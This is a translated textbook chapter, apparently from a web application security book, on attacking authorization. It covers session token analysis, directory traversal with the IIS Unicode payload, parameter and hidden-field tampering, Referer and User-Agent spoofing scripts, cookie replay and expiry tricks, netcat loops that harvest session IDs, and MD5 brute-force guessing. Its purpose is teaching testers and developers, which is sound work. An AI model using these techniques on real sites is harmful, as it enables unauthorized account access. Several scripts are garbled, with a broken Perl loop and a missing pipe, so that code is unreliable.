举个例子，主流的哈希算法——MD5，在 Web 应用程序中被广泛使用。MD5 算法的输出总是 128 位的。因此，MD5 哈希值可以用下面三种方法来表示：

°16字节的二进制摘要 每个字节是一个从0到255的值（ $ 16 \times 8 = 128 $）。

°32 字节的十六进制摘要 32 字节的字符串表示一个 128 位数字。4 个 32 位数字，用十六进制表示，连接成一个单独的字符串。

☐ 22 字节的 Base 64 摘要 Base 64 代表 128 位。

加密了的会话令牌很难识别。比如，经 DES 或 Triple-DES 加密的数据通常显得随机。

对于识别出一个字符串所使用的加密算法，没有什么特别的规则。虽然倾向于是 8 字节的倍数，但是加密并没有长度限制。

我们会在本章后面讨论更多的攻击加密方面内容。

##### 分析数字边界

当识别出会话 ID 中的数字值时，标识出这些数字的有效范围就十分有用了。比如，如果应用程序给出一个会话 ID 值为 1234567，你能确定出合法会话 ID 的数值范围吗？表 5-4 列出了几种测试方法以及它们对应的含义。

边界测试的好处是，你能够确定对某个特定令牌发起暴力攻击的难度。从输入验证和SQL注入的观点来看，边界测试提供了关于应用程序底层结构的额外信息。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>数字测试</td><td style='text-align: center; word-wrap: break-word;'>测试成功的意义</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>提交不同长度的全由9组成的值（比如，999，9999，99999...）</td><td style='text-align: center; word-wrap: break-word;'>如果你使用的是一个20个数字的字符串，那么应用程序很可能使用一个字符串存储类型</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-128</td><td rowspan="2">会话令牌使用一个8位的有符号整数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>127</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0</td><td rowspan="2">会话令牌使用一个8位的无符号整数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>255</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-32 768</td><td rowspan="2">会话令牌使用一个16位的有符号整数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>32 767</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0</td><td rowspan="2">会话令牌使用一个16位的无符号整数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>65 535</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-2 147 483 648</td><td rowspan="2">会话令牌使用一个32位的有符号整数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2 147 483 647</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0</td><td rowspan="2">会话令牌使用一个32位的无符号整数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4 294 967 295</td></tr></table>

### 5.1.4 差异分析

有时候，精心制作一个正确的请求很困难，因为你甚至连什么字段代表什么都不知道。笔者采用一种叫做差异分析（differential analysis）的技术，该技术证明是很成功的。差异分析技术非常简单：本质上就是用两个不同的账户爬行 Web 站点，比较其不同之处，例如 Cookie 和/或其他授权/状态追踪数据在什么地方有所不同。举个例子，一些 Cookie 值可能反映出用户配置或设置的不同；而其他一些值，比如 ID 值，可能很接近；还有一些值，可能根据每个用户的权限而各不相同。

注意 我们在本章稍后“授权攻击案例分析”一节中提供了一个差异分析的真实例子。

#### 5.1.5 角色矩阵

一个能帮助进行授权审计过程的工具是角色矩阵（role matrix）。角色矩阵中包括了应用程序中所有用户（或用户类型）的列表及其对应的访问权限。用户矩阵可以图形化地说明应用程序中访问令牌和 ACL 间的关系。用户矩阵的目的并不是要来对每一个允许的操作进行彻底的分类，而是要记录操作是怎样执行的，以及操作需要什么样的会话令牌。表 5-5 中就是一个矩阵的例子。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>角色</td><td style='text-align: center; word-wrap: break-word;'>用户</td><td style='text-align: center; word-wrap: break-word;'>管理员</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>查看自己的配置</td><td style='text-align: center; word-wrap: break-word;'>/profile/view.asp?UID=TB992</td><td style='text-align: center; word-wrap: break-word;'>/profile/view.asp?UID=MS128</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>修改自己的配置</td><td style='text-align: center; word-wrap: break-word;'>/profile/update.asp?UID=TB992</td><td style='text-align: center; word-wrap: break-word;'>/profile/update.asp?UID=MS128</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>查看其他人的配置</td><td style='text-align: center; word-wrap: break-word;'>n/a</td><td style='text-align: center; word-wrap: break-word;'>/profile/view.asp?UID=MS128&amp;EUID=TB992</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>删除用户</td><td style='text-align: center; word-wrap: break-word;'>n/a</td><td style='text-align: center; word-wrap: break-word;'>/admin/deluser.asp?UID=TB992</td></tr></table>

角色矩阵与功能映射表类似。当我们包含了每个用户对某项特定功能访问的 URI 时，该模式就显现出来。请注意表 5-5 中管理员是如何通过添加 EUID 参数来查看其他用户的配置的。用户矩阵还有助于确定会话信息和随后的授权方法是在哪里被处理的。大多数情况下，Web 应用程序在整个站点中通过一种稳定可靠的方式来处理会话状态。比如，一个应用程序可能仅仅依赖于 Cookie 值授权，在这种情况下，矩阵就可能是 Cookie 名和 Cookie 值，诸如 AppRole=manager，UID=12345 及 IsAdmin=false。其他一些应用程序可能会将该信息放在 URL 中，在这种情况下，同样的值就以参数的形式出现。

如果应用程序个直接使用变量名，矩阵就更加有用了。比如，应用程序可以简单地为每个参数指定一个字母，但是这样不会妨碍你通过修改参数值来绕过授权。最终，你将可以把各种类型的攻击方案汇集起来，这在应用程序包含很多不同级别的用户类型时，非常有用。

接下来，我们将给出一些攻击 Web 应用程序认证机制的例子。

### 5.2 攻击 ACL

既然知道了什么是授权数据以及它的位置,那么我们会问,“通常是如何攻击它的呢?”我们首先讨论 ACL 攻击,因为 ACL 是 Web 应用程序授权中最常用的。所有的 Web

应用程序都在一定程度上依赖于资源 ACL 的保护，但并非所有的 Web 应用程序都会实现访问/会话令牌（很多应用程序是通过本地账户扮演它们获得相同的效果）。另一方面，ACL 攻击是最简单的，而攻击授权/会话令牌通常需要更多的工作。因此，最早及最易用的 Web 应用程序攻击通常与薄弱的 ACL 相关。

就像在第 1 章中提过的那样，相对简单的 URI 语法，使得构造任何的资源请求都非常简单，而其中的一些请求可能会揭示出隐藏的授权边界，或者一并绕过它们。接下来，我们会讨论一些最常使用的 URI 操纵技术。

##### 目录遍历

目录遍历被认为是绕过 Web 目录或文件夹权限的经典方法。典型的 Web 目录授权攻击是使用常见的文件系统符号 “../” 来移动到当前目录的上一级。其中，极好的例子是被广为人知的 2001 年 IIS 的 Unicode 和双解码目录遍历攻击，该攻击利用了 IIS 分析和授权引擎中的一个漏洞点。该漏洞的 Unicode 变量可以按照如下步骤利用以发起攻击。通常情况下，IIS 阻止使用诸如 “/scripts/.../.../.../winnt” 的 “../” URL 来跳出 Web 文档根目录。斜线（/）的 Unicode 表示是 “%c0%af”，但是，由于存在 bug，IIS 没有完全解码 Unicode 表示形式，而是直到授权检查之后才解码，这就使得恶意用户可以通过诸如 “/scripts/...%c0%af..%c0%afwinnt” 的 URL，访问到文档根目录外的对象。

##### “隐藏”资源

对应用程序仔细地剖析（参见第2章）也可以找出它的目录和文件的命名习惯。比如，如果存在一个/user/menu目录，那么也可能存在一个/admin/menu目录，当然这依赖于是否实施了保护管理员前台的简单的隐匿操作。命名习惯使得猜测目录名字成为一个可用的方法，用来挖掘站点的“隐藏”部分，就像前面提到的那样，可以用来作进一步的ACL踩点，

最简单的篡改都会突破这类“隐匿式的安全”（security through obscurity）。比如，有时只需修改 URL 中的对象名，黑客就可以检索到通常情况下不能够访问的文件。在你对某个报告的访问付费后，站点会显示它的链接 http://www.reports.com/data/report12345.txt。好奇的黑客可能会尝试访问 http://www.reports.com/data/report12346.txt 看看会发生什么，就可能得到 report123456.txt 的内容。

另一个通过篡改 URL 绕过授权的例子是 Cisco IOS HTTP 授权漏洞。基于 Web 的管理员界面的 URL 包含了一个在 16 和 99 之间的两位数。

http://www.victim.com/level/NN/exec/...

通过猜测 NN 的值（两位数），黑客就有可能绕过授权并访问具有更高权限的设备管理员界面。

定制程序的命名习惯同样会透露关于隐藏目录的线索，比如，可能应用程序配置（请参见第 2 章）并没有泄露出任何隐密的或管理员的目录，但是若注意到应用程序在变量（secPass）和一些页面（secMenu.html）前使用“sec”，尝试看看“/secadmin”而不是“/admin”会怎么样呢？

提示 常见的“隐藏”Web应用程序资源常常是路径猜测攻击的目标，这些内容将在第10章中列出。

### 5.3 攻击令牌

这一节描述针对 Web 应用程序的访问/会话令牌的常见攻击。基本的访问/会话令牌攻击种类有三种：

☐ 预测（手动和自动）

○ 捕捉/重放

☐ 定置

下面我们来顺次讨论每一个类别。

### 5.3.1 手动预测

访问/会话令牌预测是攻击 Web 应用程序授权最简单的方法之一。其本质是用直达目标的方式操纵令牌，从而绕过访问控制。我们首先讨论手动预测，在下一节中讨论自动化分析技术，这种技术可以快速预测看起来难以破解的令牌。

在预测最简单的访问令牌/会话 ID（比如那些人们可直接阅读的语法或格式）时，手动猜测常常是很有效的。举个例子来说，在第 1 章中，我们看到了在 Foundstone 的应用程序例样 Hacme Bank Web 中，如何简单地把“account_type”的值从“Silver”改变为“Platinum”，就可以执行一次权限提升攻击。这一节将描述手动篡改攻击，这些攻击针对如下常见的会话状态跟踪机制：

☐ 查询字符串

☐ POST 数据

o HTTP 头

o Cookie

##### 查询字符串

就像在第 1 章中描述的那样，查询字符串是 URL 中问号（?）后面的内容，包含了客

户端提供的附加参数，这些参数是传递给服务端执行的。查询字符串由分隔符（&）分隔多个参数值。访问/会话令牌通常会包含在查询字符串中，比如：

http://www.mail.com/mail.aspx?mailbox=joe&company=acme

其中查询字符串，`mailbox=joe&company=acme`，就是从客户端传递到 `mail.aspx` 脚本的参数，该 `mail.aspx` 脚本位于“?”前面。可以试着改变“`mailbox`”的参数为其他的用户名，比如/mail.aspx?mailbox=jane&company=acme，如此尝试以 Joe 的身份查看 Jane 的邮箱。查询字符串在浏览器的地址栏中可以看到，并且很容易修改，不需要任何特殊的 Web 攻击工具。

#### ☑ 对敏感的数据使用 POST

我们不推荐在查询字符串中携带会话ID，因为它显示在浏览器的地址栏中，很容易被别有用心的人篡改。另外，和POST数据不一样，URI和查询字符串会记录在浏览器历史和Web服务器日志中，从而有更多暴露的可能。在人们发送关于URI的电子邮件时，查询字符串也常常被不加区别的共享。最后，要注意的是，即使使用了SSL，查询字符串也会在上述这些情况下被暴露。

由于这些问题，很多 Web 应用开发人员更偏向于使用 POST 方法（在 HTTP 请求体中携带参数值，使篡改更困难），而不是 GET 方法（在查询字符串中携带数据，会被浏览器缓存、日志保存，从而更容易受到攻击）。

注意 不要只是因为客户端无法“亲眼看见”，就错误地认为操纵 POST 数据是困难的。正如我们在第 1 章中阐明的那样，这实际上非常简单。

当然，在任何情况下，敏感的授权数据都应该用其他方法来保护，而不只是简单的隐匿。但是，正如我们说到的那样，安全加上隐匿是决不会有害处的。

##### POST 数据

因为很多应用程序需要把客户端提供的数据和会话对应起来，所以 POST 数据经常会包含授权/会话信息。下面的例子显示了用 Curl 工具创建一个 POST 请求，发送到一个银行账户应用程序，该请求包含了一些有趣的字段：“authmask”（还无法确切知道指的是什么，但其中的“auth”看起来很值得进一步探讨），“uid”（这想必是代表 uesr ID），以及一个值为“viewacct”的就叫做“a”的参数（这想必就是某种与查看其他用户账号数据相关的管理员功能）。

$ curl -v -d 'authmask=8195' -d 'uid=213987755' -d 'a=viewacct' \
> --url https://www.victim.com/
* Connected to www.victim.com (192.168.12.93)
> POST / HTTP/1.1

User-Agent: curl/7.9.5 (i686-pc-cygwin) libcurl 7.9.5 (OpenSSL 0.9.6c)
Host: www.victim.com
Pragma: no-cache
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
authmask=8195&uid=213987755&a=viewacct

在这个例子中有个有趣的地方需要注意，Curl 自动计算出了 HTTP 头的内容长度，这个值必须和 POST 数据中的字符个数相匹配。如果 POST 内容被篡改了，则该字段需要重新计算。

“隐藏”表单字段 另一种通过隐匿实现安全的经典技术，是在 HTML 表单中使用叫做“hidden”的属性来传递诸如会话 ID、产品价格或营业税等敏感数据。虽然这些字段对通过浏览器查看 Web 站点的用户是不可见的，但仍可在 Web 页面的 HTML 源码中看到。攻击者会经常检查表单字段的真实标签，因为字段名或 HTML 注释都可能提供关于字段功能的额外线索。

提示 第1章讨论过的 WebScarab 工具提供了很好的“显示隐藏字段”功能，使得那些隐藏字段在正常的浏览器会话中也会出现。

下面是从一个应用程序的登录页面中提取出的部分 HTML 表单的源代码，让我们看看它是怎样遭到授权攻击的。

<FORM name=login_form action=
https://login.victim.com/config/login?4rfr0naidr6d3 method=post >
<INPUT name=Tries type=hidden> <INPUT value=us name=I8N type=hidden>
<INPUT name=Bypass type=hidden> <INPUT value=64mbvjoubpd06 name=U type=hidden> <INPUT value=pVjsXMKjKD8rlggZTYDLWwNY_Wlt name=Challenge type=hidden>
User Name:<INPUT name=Login>
Password:<INPUT type=password maxLength=32 value=" " name=Passwd>

当用户提交他的用户名和密码时，实际上给服务器共提交了七段信息，'但是只有其中两段在 Web 页面上可见，表 5-6 总结了这些值。

在这个例子中，隐藏字段 “U” 似乎是在追踪会话状态信息，但到现在还不清楚是否存在漏洞。关于如何分析未知值，请查看本章稍后有关会话 ID 自动预测的讨论。

##### HTTP 头

HTTP 头作为 HTTP 协议本身的一部分传送，有时也用来传送授权/会话数据。Cookie

可能是最广为人知的 HTTP 头, 通常用做授权/状态追踪, 但是授权机制也可以基于 Location: 头和 Referer: 头（我们即将谈到 Referer 拼写的来由）。

注意 应用程序也可能会依赖于自定义头来追踪用户的某些特定属性。

User-Agent 在授权验证测试中，最容易突破的是对客户端的浏览器类型和版本的验证，该验证一般通过检查 User-Agent HTTP 头来实现。很多工具，包括 Curl，都可以让用户指定一个任意的 User-Agent 头。因此，把对 User-Agent 头的检查作为授权验证机制，是没有实际意义的。举个例子来说，如果一个应用程序由于政策而不是技术的原因，要求使用 Internet Explorer（比如要求用某个特定的 ActiveX 组件），那么你可以改变 User-Agent 头来冒充 IE。

$ curl --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" \
> --url www.victim.com

Cookie Cookie 值可能是最常见的存放授权/状态信息的地方。它们通过 HTTP Set-Cookie 头来设置，如下例所示：

 $$  Set-Cookie:NAME=VALUE；expires=DATE；path=PATH； $$ 

一旦设置成功，客户端就可以使用 Cookie 头简单地把 Cookie 重发回服务器，这看起来几乎和 Set-Cookie 头一样。

由于 Cookie 在授权中十分常见，我们会在接下来的小节中专门进行讨论。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>值</td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>潜在的漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Tries</td><td style='text-align: center; word-wrap: break-word;'>可能代表用户尝试登录到应用程序的次数。现在为 NULL，因为我们还没有提交密码。如果该值超过了限定值，服务器将会锁定账号该字段的值被设置成“us”。因为该字段看起来是用来处理站点语言的，所以改变该值可能不会对会话有任何的安全影响该字段的名称听起来很令人激动。Bypass需要一个特定的字符串吗？或者它是一个布尔值，这样用户不需要密码就可以登录？一个未知的字段。该字段可能包含一个会话标识符或者应用程序的信息</td><td style='text-align: center; word-wrap: break-word;'>因为锁定的变量携带于客户端上，所以在一个密码猜测攻击中，很容易通过改变其值（比方说，保持为 0）来避免被锁定；或者把任意用户锁定，发起拒绝服务攻击该字段仍可能受到输入验证攻击。更多的信息请参见第6章该字段绕过登录页面，可以实施一次授权攻击可能包含经过编码（容易破解）或加密的（通常不容易破解）敏感的会话数据</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>值</td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>潜在的漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Challenge</td><td style='text-align: center; word-wrap: break-word;'>该字段应该是挑战-应答认证机制的一部分</td><td style='text-align: center; word-wrap: break-word;'>篡改该字段可能会使认证无效，但是你不会察觉。也可能会受到输入验证的攻击</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Login</td><td style='text-align: center; word-wrap: break-word;'>用户的登录名</td><td style='text-align: center; word-wrap: break-word;'>SQL 注入攻击可能对这个感兴趣（见第 7 章）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Passwd</td><td style='text-align: center; word-wrap: break-word;'>用户的密码</td><td style='text-align: center; word-wrap: break-word;'>SQL 注入攻击可能对这个感兴趣</td></tr></table>

Referer Web 应用程序开发者的一个常犯错误，就是太相信包含在 Referer 头中的信息了，而且还把它作为了认证的一种形式。那么，Referer 头是做什么的呢？为什么它是一个安全错误呢？还有拼写错误的原因是什么呢？

Referer 头非常简单。本质上说，它告诉服务器请求中的 URI 资源是从哪个 URI 获得的（即，它是从什么地方来的）。当你点击链接时，Referer 自动由你的浏览器添加，但如果你自己输入 URI 则不然。比如，如果你在站点 A 上，点击一个链接到达站点 B，Referer 头会包含站点 A 的 URI 作为 HTTP 请求头的一部分，就像下面这样：

Referer: http://www.siteA.com/index.html

为什么依赖 Referer 头授权是错误的呢？就像通常在 Web 应用程序中实现的那样，每次通过链接访问到一个新区域时，服务器上的一段自定义代码就会检查 Referer 头。如果 Referer 头中的 URL 与预期的相同，就同意该请求。否则，就拒绝请求，把用户送到其他的地方，一般是一个错误页面或者类似的页面。

我们可以从下面这段代码例子中看到该流程是如何工作的。这是个简单的 Referer 头认证协议，属于一个 .asp 页面的一部分。

strReferer = Request.ServerVariables("HTTP_REFERER")
If strReferer = "http://www.victim.com/login.html" Then
    ' this page is called from login..htm!
    ' Run functionality here
End If

在这种情况下，这段代码只寻找预期的 URL http://www.victim.com/login.html。如果此 URL 存在，就同意该请求；否则，就拒绝该请求。所有依赖 Referer 头的认证机制的工作方式都和基础认证类似，但该方法和基础认证之间的最大区别是，Web 浏览器会基于上级 URL 自动生成一个 Referer 头，而基础认证则根据用户某个特定的行为，比如单击一个登录按钮来生成它的认证信息。

为什么开发者会使用一个包含 URL 的 Referer 头来作认证呢？主要的原因在于简洁。这种方法依赖于一个假设，就是如果一个用户遵循这个特定的路径，那么他一定来自于一个受信任的域。这在实际中会有一些明显的负面效果。比如说一个站点包含了一个基于

Referer 头认证的管理员区域，一旦用户已经访问了某个特定的页面，比如菜单页面，那么他就可以访问这个区域中的所有其他页面了。

必须认识到的一件很重要的事情是设置 Referer 信息的是客户端，而不是服务端，而如果客户端可以设置一段信息，那么也就可以改变它。Referer 信息是很容易欺骗人的，下面是一个 PERL 代码的例子。

use HTTP::Request::Common qw(POST GET);
use LWP::UserAgent;

$ua = LWP::UserAgent->new();
$req = POST ' http://www.victim.com/doadminmenu.html';
$req->header(Referer => ' http://www.victim.com/adminmenu.html');
$res = $ua->request($req);

在这个例子中，从代码上看起来请求好像来自于 adminmenu.html，但实际上它可以来自于任何地方。记住，HTTP 头是很容易欺骗人的。在这个例子中，它需要的只是一小片代码。就像一句老安全格言说的那样，让安全依赖于信息的名字决不是个好主意，因为这些信息可以被轻易地冒充、重放甚至是猜测。还有一个相关的安全格言在这里也适用：决不要相信客户端的输入。

那拼写错误是怎么回事呢？这要回溯到 Internet 的早期。在那个时候，所有的东西都很有个性，拼写错误并不阻碍它成为标准。它就这样延用到了现在。现在我们已经告诉了你利用 HTTP Referer 头作为认证应该了解的所有事情。

##### Cookie

就像我们先前提到的那样，Cookie 虽然有着波折的安全历史，但仍是一种非常流行的 Web 应用授权/会话管理方式（因为它的重要角色，多少年来，恶意攻击者想出了无数的方法来捕获、劫持、窃取、操纵或滥用 Cookie）。但是，这些攻击并不是针对 Cookie 本身的缺陷，而是对所运行的现代客户端和服务器端软件的攻击，或者从某种程度上说，是对 HTTP 协议本身的攻击。Cookie 在 RFC 2109 中有更详细的描述（参见本章末尾的“参考和进一步阅读”一节来获得关于 Cookie 参考的链接）。就像我们在本章前面关于 HTTP 头的小节中描述的那样，Cookie 通过 Set-Cookie 和 Cookie 头来管理，一般的 Internet 客户端不会显示。

通常，Cookie 几乎存储所有的数据，并且其所有的字段都可以通过第 1 章中提到的 HTTP 分析工具而轻易地改变。对于专门针对 Cookie 的分析工具，我们推荐 CookieSpy，它是 Internet Explorer 上的一个插件。在浏览器上打开一个面板就可以显示一个站点的所有 Cookie，还允许你操纵和重放它们。图 5-3 显示了 CookieSpy 对一个应用程序的结果报告，图 5-4 显示了怎样使用 CookieSpy 来改变 Cookie 的值（单击名称左边的“×”来编辑它的值）。

 </div>

 </div>

通常是怎样滥用 Cookie 而击败授权的呢？下面是一个例子，该应用程序使用 Cookie 来执行一个 “记住我” 类型的功能，用做授权/状态的跟踪。

00:00:00 GMT; path=/; domain=victim.com

尽管该 Cookie 内容做了一些加密, 但即使不熟练的攻击者也可以轻易地把这段 Cookie 值复制下来, 在他们自己的机器上重放, 就有可能使自己 “成为” 该值所识别的用户。只要做一点更深入的分析就可以知道, 这段看起来含有随机字符的自动记录的值, 其实只不过是字符串 “mike:mys3cr3t” 的 Base 64 编码——像是存在系统上的用户名和密码。最后, RFC2109 中定义的 “secure” 关键字没有在该 Cookie 中出现, 这意味着浏览器允许该 Cookie 用明文在 HTTP 上发送。

绕过 Cookie 过期时间 当退出一个使用 Cookie 的应用程序时，在过期时间到达后，通常的动作是设置 Cookie 值为 NULL（即，“Set-Cookie:”），这样就清除了 Cookie。一个应用程序也可以使用过期时间强制用户每 20 分钟重认证一次。也就是说，从用户第一次认证后，Cookie 只有 20 分钟的有效期。当 Cookie 过期后，浏览器就删除它。应用程序会注意到 Cookie 已经不存在，并向用户要求新的证书。只要使用得当，这似乎是一个让失效会话超时的有效办法。

举个例子，如果应用程序设置了一个“使用密码”的值，并且让它在20分钟后过期，

Set-Cookie: HasPwd=451fhj28fmnw; expires=Tue, 17-Apr-2006
12:20:00 GMT; path=/; domain=victim.com

那么攻击者有可能尝试推后过期时间，看看服务器是否仍信任该 Cookie（注意加粗的文字，我们已经将过期日期改变为一年后）：

Set-Cookie: HasPwd=451fhj28fmnw; expires=Tue, 17-Apr-2007
12:20:00 GMT; path=/; domain=victim.com

这样，攻击者就可以判断出服务器是否在控制会话时间。如果这个新的 Cookie（在一年零二十分钟内有效）持续了一个小时，那攻击者就知道了，这个 20 分钟的窗口是任意的——服务器在执行一个六十分钟的硬超时。

#### 5.3.2 自动预测

如果一个访问令牌/会话 ID 并不是人们凭直觉所能识别的，那么就有必要执行自动化分析了。本节将讨论自动化分析可预测会话 ID 和加密保护值的技术。

##### 收集样本

收集足够量的会话 ID 样本，是确定一个会话 ID 是否真正 “随机” 的必要步骤。因为收集 10000 个值会使人很厌烦，所以你需要一个脚本来做这个工作。这里有三个 Perl 脚本例子，你可以对这些脚本做相应的修改来收集特定的变量（出于演示的目的，我们在这些

例子中都收集一些 COTS 的会话 ID）。

下面这个脚本 gather.sh 使用 Netcat 从 HTTP 服务器收集 ASPSESSIONID 的值:

#!/bin/sh
# gather.sh
while [ 1 ]
do
    echo -e "GET / HTTP/1.0\n\n" | \
    nc -vv $1 80 | \
    grep ASPSESSIONID
done

接下来的脚本 gather_ssl.sh 使用 Openssl 客户端，从一个 HTTPS 服务器收集 JSESSIONID 值:

#!/bin/sh
# gather_ssl.sh
while [ 1 ]
do
echo -e "GET / HTTP/1.0\n\n" | \
openssl s_client -quiet -no_tls1 -connect $1:443 2>/dev/null | \
grep JSESSIONID
done

最后, gather_nudge.sh 脚本使用 Openssl 客户端从 HTTPS 服务器收集 JSESSIONID 值, 不过在设置 Cookie 前 POST 了一个服务器要求的特殊登录请求:

#!/bin/sh
# gather_nudge.sh
while [ 1 ]
do
cat nudge \
openssl s_client -quiet -no_tls1 -connect $1:443 2>/dev/null | \
grep JSESSIONID
done

该脚本中 “nudge” 文件的内容如下:

POST /secure/client.asp?id=9898 HTTP/1.1
Accept: */*
Content-Type: text/xml
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)
Host: www.victim.com
Content-Length: 102

Connection: Keep-Alive
Cache-Control: no-cache
<LoginRequest><User><SignInName>latour</SignInName><Password>Eiffel</Password></LoginRequest>

每个脚本进入一个无限循环。确保把输出重定向到一个文件中来保存结果，比如：

$./gather.sh www.victim.com | tee cookies.txt
$./gather_ssl.sh www.victim.com | tee cookies.txt
$./gather_nudge.sh www.victim.com | tee cookies.txt

提示 使用 GUN 的 cut 命令和 grep 命令可以解析出 cookies.txt 中的真实值。

##### 非线性分析

如何测试一组会话 ID 真正的随机度呢？2001 年 4 月，Bindview 团队的 Michal Zalewski 将非线性分析技术应用于 TCP 连接的初始序列号中（initial sequence numbers，ISN），并且得到了一些关于数值随机性的有趣结果。那篇论文最直观的地方是用图形的方式说明分析结果。图 5-5 和图 5-6 中形象地显示了在两个源中相关随机性的区别。

 </div>

 </div>

ISN 是每新建一个的 TCP 连接而产生的一个随机数, 很像是 Web 服务器产生的会话 ID。产生这些图的函数不需要任何复杂的算法。每个坐标的定义如下:

 $ x[t] = \text{seq}[t] - \text{seq}[t-1] $
 $ y[t] = \text{seq}[t-1] - \text{seq}[t-2] $
 $ z[t] = \text{seq}[t-2] - \text{seq}[t-3] $

从数据集中选取随机值作为 “seq” 数组；“t” 是数组下标。试一试将这个技术用在你从应用程序中收集的会话值上。产生数据集其实很简单，下面这个 Perl 脚本接受一系列的数字，计算每个点，并（为了我们的目的）输出 x，y 和 z:

#!/usr/bin/perl
# seq.pl
@seq =();
@x = @y = @z =();
while(<>) {
    chomp($val = $_);
    push(@seq, $val);
}
for ($i = 3; $i < $#seq; $i++) {
    push(@x, $seq[$i] - $seq[$i - 1]);
}

push(@y, $seq[$i - 1] - $seq[$i - 2]);
push(@z, $seq[$i - 2] - $seq[$i - 3]);
}
for ($i = 0; $i < $#seq; $i++) {
print $x[$i] . " ". $y[$i] . " ". $z[$i] . " \\n";
}

注意 该函数不能用来预测值，它仅仅表明预测一个值是多么困难。蹩脚的会话生成器很有可能被利用。

为了使用该脚本，我们在一个名为 session.raw 的文件里收集会话数据，然后通过 Perl 脚本使用管道传输这些数据，并且输出到一个叫做 3d.dat 的数据文件中：

$ cat session.raw | ./seq.pl > 3d.dat

这个 3d.dat 文件的每行都包含了 X，Y 和 Z 坐标。使用诸如 Gnuplot 的工具，根据这些结果来画图。记住，这个方法不是用来预测会话 ID 的，但它对于确定预测值到底有多难很有用。

##### 暴力/字典攻击

在前面指纹探测小节中，我们注意到 MD5 哈希算法的一些关键特征。如果确定发现了一个 MD5 哈希值，那么你可以使用经典的暴力猜测来确定初始的明文值。比如，下面这段 Perl 命令使用 Digest::MD5 模块，来尝试登录证书和对应的 MD5 哈希的不同组合：

$ perl -e 'use Digest::MD5; \
> print Digest::MD5::md5_base64("userpasswd")
ZBzxQ5hVyDnyCZPUM89n+g
$ perl -e 'use Digest::MD5; \
> print Digest::MD5::md5_base64("passwduser")
seV1fBcI3Zz2rORI1wiHkQ
$ perl -e 'use Digest::MD5; \
> print Digest::MD5::md5_base64("passwdsalt")
PGXfdI2wvL2fNopFweHnyA

如果会话令牌匹配了这些值中的某一个，那么你就已经找出它的明文了。

使用 MD5 的站点，经常插入随机数据或者一些动态的值来对抗暴力猜测攻击，比如，一个更安全的生成令牌的方法，尤其是基于密码的，就包含一个秘密数据和一个时间戳。

MD5(epoch time + secret + password)

将变化最快的数据放在前面，会使得 MD5 “雪崩”（avalanche）得更快——雪崩效应意味着两个只有很少差别的值所产生的哈希值却有很大的差别。它的优点是一个恶意用户只拥有三段种子值中的一段。找到正确的 epoch time 值不是很困难（不过是 100 个可能值

中的一个），但是服务器的秘密数据则很难猜测。当然，还是可以发起一次暴力攻击，但是想要成功就很困难了。它的缺点是服务器重建哈希值会很困难，因为服务器必须跟踪该值产生的时间，才能生成正确的值。

一个 “没那么安全” (“多一点” 和 “少一点” 在密码学中是不确切定义的术语）但同样可行的方法是使用服务器的秘密数据和用户的密码：

MD5( secret + password )

在这种情况下，用户需要猜测一个值——服务器的秘密数据。如果它的值少于 8 个字符，那么恶意用户很可能攻击成功。

这种方法对加密的值也同样适用。

##### 位翻转

攻击者如果留意所收集到的加密数据的变化趋势，或许可以获得一臂之力。比如，你可能会收集到一系列仅在某些部分有区别的会话令牌，就像下面这样：

46Vw8VtZCAvfqpSY3F0tMGbhI
4mHDFHDtyAvfqpSY3F0tMGbjV
4tqnoriSDAvfqpSY3F0tMGbgV
4zD8AEYhcAvfqpSY3F0tMGbm3

注意到这个变化趋势了么？每个值都是以 4 开头。如果它是一个加密了的字符串，这可能不是其中的一部分。在 4 之后是 8 个随机字节，然后是 14 个不变的字节，最后是 2 个随机字节。如果这是一个加密后的字符串，那么我们可以对其内容根据经验进行一些猜测。我们假设它是用 3-DES 加密的，因为 DES 是公认比较弱的加密算法：

 $$ \begin{array}{r l r l r l}{{S t r i n g~=~d i g i t~+~3D E S(~n o n c e~+~u s e r n a m e~(+~f l a g s)~+~c o u n t e r~)}}\\ {4}&{8\mathrm{~b y t e s~14~b y t e s}}&{2\mathrm{~b y t e s}}\\ \end{array} $$ 

下面是我们的判断依据。

☐ 8 个字节的部分总是变化。值是被加密的，因此我们无法知道它们是递增的、递减的、还是随机的。无论如何，源数据一定在变化，因此我们称之为 nonce。

有 14 个字节保持不变。这意味着加密数据来自于一个静态的源，可能是用户名，姓氏，或者是一个“电子邮件提醒我”的标志。这也可能意味着这是一个完全不同的加密字符串，只是连接到前面的 8 个字节。就像你看到的这样，我们开始有点茫然了。

